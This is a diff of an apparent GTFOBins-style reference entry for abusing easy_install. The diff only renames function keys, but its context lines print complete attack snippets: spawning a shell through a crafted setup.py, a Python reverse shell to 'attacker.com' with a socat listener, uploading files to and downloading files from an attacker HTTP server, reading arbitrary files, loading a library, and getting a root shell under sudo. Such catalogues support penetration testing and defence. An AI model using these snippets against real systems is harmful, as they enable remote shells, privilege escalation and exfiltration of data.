@@ -1,11 +1,11 @@
 ---
 functions:
-  execute-interactive:
+  shell:
     - code: |
         TF=$(mktemp -d)
         echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
         easy_install $TF
-  reverse-shell-interactive:
+  reverse-shell:
     - description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
       code: |
         export RHOST=attacker.com
@@ -16,7 +16,7 @@ functions:
         [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
         pty.spawn("/bin/sh")' > $TF/setup.py
         easy_install $TF
-  upload:
+  file-upload:
     - description: Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
       code: |
         export URL=http://attacker.com/
@@ -36,7 +36,7 @@ functions:
         else: import SimpleHTTPServer as s, SocketServer as ss
         ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py
         easy_install $TF
-  download:
+  file-download:
     - description: Fetch a remote file via HTTP GET request. The file path must be absolute.
       code: |
         export URL=http://attacker.com/file_to_get
@@ -62,12 +62,12 @@ functions:
         TF=$(mktemp -d)
         echo 'print(open("file_to_read").read())' > $TF/setup.py
         easy_install $TF
-  load-library:
+  library-load:
     - code: |
         TF=$(mktemp -d)
         echo 'from ctypes import cdll; cdll.LoadLibrary("lib.so")' > $TF/setup.py
         easy_install $TF
-  sudo-enabled:
+  sudo:
     - code: |
         TF=$(mktemp -d)
         echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
